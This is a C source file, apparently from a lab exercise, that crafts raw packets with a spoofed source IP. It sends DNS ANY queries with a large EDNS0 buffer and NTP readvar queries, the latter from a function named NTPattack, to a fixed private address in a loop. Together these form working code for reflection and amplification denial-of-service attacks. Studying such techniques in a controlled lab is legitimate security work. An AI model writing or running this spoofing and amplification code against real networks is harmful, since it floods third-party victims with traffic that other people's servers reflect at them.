/*
==================REFERENCE===============
DNS query code: https://gist.github.com/fffaraz/9d9170b57791c28ccda9255b48315168
IP spoofing code: https://www.winsocketdotnetworkprogramming.com/winsock2programming/winsock2advancedrawsocket11c.html
DNS: https://tools.ietf.org/html/rfc1035
eDNS0: https://tools.ietf.org/html/rfc6891
*/

 
//Header Files
#include<stdio.h> //printf
#include<string.h>    //strlen
#include<stdlib.h>    //malloc
#include<sys/socket.h>    //you know what this is for
#include<arpa/inet.h> //inet_addr , inet_ntoa , ntohs etc
#include<netinet/in.h>
#include<unistd.h>    //getpid

#include<time.h>
 
//List of DNS Servers registered on the system
//Types of DNS resource records :)
 
#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server
#define T_ANY 255 // *
 
//Function Prototypes
void ngethostbyname (unsigned char* , int);
void NTPattack ();
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
unsigned short checksum(unsigned short*, int);

// IPv4 header
typedef struct
{
    unsigned char  ip_verlen;        // 4-bit IPv4 version 4-bit header length (in 32-bit words)
    unsigned char  ip_tos;           // IP type of service
    unsigned short ip_totallength;   // Total length
    unsigned short ip_id;            // Unique identifier
    unsigned short ip_offset;        // Fragment offset field
    unsigned char  ip_ttl;           // Time to live
    unsigned char  ip_protocol;      // Protocol(TCP,UDP etc)
    unsigned short ip_checksum;      // IP checksum
    unsigned int   ip_srcaddr;       // Source address
    unsigned int   ip_destaddr;      // Source address
} IPV4_HDR;

// Define the UDP header
typedef struct
{
    unsigned short src_portno;       // Source port no.
    unsigned short dst_portno;       // Dest. port no.
    unsigned short udp_length;       // Udp packet length
    unsigned short udp_checksum;     // Udp checksum (optional)
} UDP_HDR, *PUDP_HDR;
 
//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number
 
    //flags
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 
//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};
 
//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct RES_RECORD
{
    unsigned char name;        //empty(root doamin)
    unsigned short type;        //OPT
    unsigned short _class;      //sender's UDP payload size
    unsigned int ttl;           //extended RCODE(8bit), version(8bit, 0) and flags z(16bit)
    unsigned short data_len;    //describes RDATA
    //struct RDATA *rdata;       //{attribute, value} pairs
};
#pragma pack(pop)
 
//Pointers to resource record contents


struct RDATA
{
    unsigned short opt_code;    //assigned by IANA
    unsigned short opt_length;  //size(in octets) of opt_data
    unsigned char *opt_data;    //varies per option_code
};
 
//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;
 
int main( int argc , char *argv[])
{
    for (int i = 0; i < 10; i++) {
        unsigned char host[] = "yes.com";
        ngethostbyname(host , T_ANY);
        NTPattack();
    }
 
    return 0;
}
 
/*
 * Perform a DNS query by sending a packet
 * */
void ngethostbyname(unsigned char *host , int query_type)
{
    
    char      ipbuf[65536], // large enough buffer
        *ipdata=NULL;
    IPV4_HDR *v4hdr=NULL;
    UDP_HDR  *udphdr=NULL;
    unsigned short sourceport = 68;
    unsigned short destport=53;
    unsigned short      payload,  // size of UDP data
            optval;
    struct sockaddr_in ipdest;

    //sourceport = (unsigned short)(clock() & 0xFFFF);
    ipdest.sin_family = AF_INET;
    ipdest.sin_port   = htons(destport);
    ipdest.sin_addr.s_addr = inet_addr("192.168.20.1");
    
    // Create the raw UDP socket
    int ipsock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    struct sockaddr_in saddr;
    socklen_t socklen = sizeof(struct sockaddr_in);
    if (getsockname(ipsock, (struct sockaddr*)&saddr, &socklen) < 0) {
        return;
    }
    //sourceport = saddr.sin_port;

    // Initialize the IPv4 header
    v4hdr = (IPV4_HDR*) ipbuf;
    v4hdr->ip_verlen = 0x45;//((4 << 4) | (sizeof(IPV4_HDR) / sizeof(unsigned long)));
    v4hdr->ip_tos    = 0;
    v4hdr->ip_id     = 0;
    v4hdr->ip_offset = 64;
    v4hdr->ip_ttl    = 64;    // Time-to-live is eight
    v4hdr->ip_protocol = IPPROTO_UDP;
    v4hdr->ip_checksum = 0;
    v4hdr->ip_srcaddr  = inet_addr("192.168.30.1");
    v4hdr->ip_destaddr = inet_addr("192.168.20.1");
    
    // Initialize the UDP header
    udphdr = (UDP_HDR *)&ipbuf[sizeof(IPV4_HDR)];
    udphdr->src_portno = htons(sourceport);
    udphdr->dst_portno = htons(destport);
    udphdr->udp_checksum = 0;




    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;
 
    struct sockaddr_in a;
 
    struct RES_RECORD *addit; //the replies from the DNS server
 
    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;

 
    printf("Resolving %s\n" , host);
 




    //Set the DNS structure to standard queries
    dns = (struct DNS_HEADER *)&ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR)];
 
    dns->id = (unsigned short) htons(getpid());

    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = htons(1); //we have only 1 question
 
    //point to the query portion
    qname =(unsigned char*)&ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR) + sizeof(struct DNS_HEADER)];
 
    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR) + sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it
 
    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1); //its internet (lol)

    payload = sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1) + sizeof(struct QUESTION);

    addit = (struct RES_RECORD*)&ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR) + payload];
    payload += sizeof(struct RES_RECORD);
    addit->name = 0;
    addit->type = htons(41);   //OPT
    addit->_class = htons(4096);
    addit->ttl = 0x00800000;
    addit->data_len = 0;
    //addit->rdata = NULL;




    v4hdr->ip_totallength = htons(sizeof(IPV4_HDR) + sizeof(UDP_HDR) +  payload);
    udphdr->udp_length = htons(sizeof(UDP_HDR) + payload);
    // Calculate checksum for IPv4 header
    //   The checksum() function computes the 16-bit one's
    //   complement on the specified buffer.
    v4hdr->ip_checksum = checksum((unsigned short*)v4hdr, sizeof(IPV4_HDR));
 





    // Initialize the UDP payload to something
    ipdata = &ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR)];
    
    
    // Set the header include option
    optval = 1;
    setsockopt(ipsock, IPPROTO_IP, IP_HDRINCL, (char *)&optval, sizeof(optval));

    int yes = 1;
    setsockopt(ipsock, SOL_SOCKET, SO_BROADCAST, (char*)&yes, sizeof(yes));
    
    // Send the data
    
    printf("Sending Packet %d...", payload);

    int n = sendto(ipsock, ipbuf, sizeof(IPV4_HDR) + sizeof(UDP_HDR) + payload, 0, (struct sockaddr*)&ipdest, sizeof(ipdest));





    if( n < 0)
    {
        perror("sendto failed");
        exit(-1);
    }
    printf("Done %d\n", n);
    
    return;
}
 
 
 
/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host) 
{
    int lock = 0 , i;
    strcat((char*)host,".");
     
    for(i = 0 ; i < strlen((char*)host) ; i++) 
    {
        if(host[i]=='.') 
        {
            *dns++ = i-lock;
            for(;lock<i;lock++) 
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

void NTPattack()
{    
    char      ipbuf[65536], // large enough buffer
        *ipdata=NULL;
    IPV4_HDR *v4hdr=NULL;
    UDP_HDR  *udphdr=NULL;
    unsigned short sourceport = 68;
    unsigned short destport=123;
    unsigned short      payload,  // size of UDP data
            optval;
    struct sockaddr_in ipdest;

    //sourceport = (unsigned short)(clock() & 0xFFFF);
    ipdest.sin_family = AF_INET;
    ipdest.sin_port   = htons(destport);
    ipdest.sin_addr.s_addr = inet_addr("192.168.20.1");
    
    // Create the raw UDP socket
    int ipsock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if( ipsock < 0)
    {
        perror("socket failed");
    }
    //printf("socket %d", ipsock);

    struct sockaddr_in saddr;
    socklen_t socklen = sizeof(struct sockaddr_in);
    if (getsockname(ipsock, (struct sockaddr*)&saddr, &socklen) < 0) {
        return;
    }
    //sourceport = saddr.sin_port;

    // Initialize the IPv4 header
    v4hdr = (IPV4_HDR*) ipbuf;
    v4hdr->ip_verlen = 0x45;//((4 << 4) | (sizeof(IPV4_HDR) / sizeof(unsigned long)));
    v4hdr->ip_tos    = 0;
    v4hdr->ip_id     = 0;
    v4hdr->ip_offset = 64;
    v4hdr->ip_ttl    = 64;    // Time-to-live is eight
    v4hdr->ip_protocol = IPPROTO_UDP;
    v4hdr->ip_checksum = 0;
    v4hdr->ip_srcaddr  = inet_addr("192.168.30.1");
    v4hdr->ip_destaddr = inet_addr("192.168.20.1");
    
    // Initialize the UDP header
    udphdr = (UDP_HDR *)&ipbuf[sizeof(IPV4_HDR)];
    udphdr->src_portno = htons(sourceport);
    udphdr->dst_portno = htons(destport);
    udphdr->udp_checksum = 0;



    /*	
    `tcpdump result` from `sudo ntpq -c rv 192.168.20.1`
    UDP data starts from 0x001c
    0x0000:  4500 0028 5702 4000 4011 4470 c0a8 0a01  E..(W.@.@.Dp....
	0x0010:  c0a8 1401 c83e 007b 0014 9f78 1602 0001  .....>.{...x....
	0x0020:  0000 0000 0000 0000 
    */
    payload = 12;
    unsigned char* buf = (unsigned char*)&ipbuf[sizeof(IPV4_HDR) + sizeof(UDP_HDR)];
    *(buf + 0) = 0x16;
    *(buf + 1) = 0x02;
    *(buf + 2) = 0x00;
    *(buf + 3) = 0x01;
    for (int i = 4; i < payload; i++) {
        *(buf + i) = 0x00;
    }


    v4hdr->ip_totallength = htons(sizeof(IPV4_HDR) + sizeof(UDP_HDR) +  payload);
    udphdr->udp_length = htons(sizeof(UDP_HDR) + payload);
    // Calculate checksum for IPv4 header
    //   The checksum() function computes the 16-bit one's
    //   complement on the specified buffer.
    v4hdr->ip_checksum = checksum((unsigned short*)v4hdr, sizeof(IPV4_HDR));
 

    // Set the header include option
    optval = 1;
    setsockopt(ipsock, IPPROTO_IP, IP_HDRINCL, (char *)&optval, sizeof(optval));

    int yes = 1;
    setsockopt(ipsock, SOL_SOCKET, SO_BROADCAST, (char*)&yes, sizeof(yes));
    
    // Send the data
    
    printf("Sending Packet %d...", payload);

    int n = sendto(ipsock, ipbuf, sizeof(IPV4_HDR) + sizeof(UDP_HDR) + payload, 0, (struct sockaddr*)&ipdest, sizeof(ipdest));


    if( n < 0)
    {
        perror("sendto failed");
    }
    printf("Done %d\n", n);
    return;
}

unsigned short checksum(unsigned short* header, int len)
{
    unsigned int sum = 0;
    int i = 0;
    while (i < len / 2)
    {
        sum += ntohs(header[i]);
        while (sum > 0xFFFF)
            sum = (sum & 0xFFFF) + (sum >> 16);
        i += 1;
    }
    return htons(~sum);
}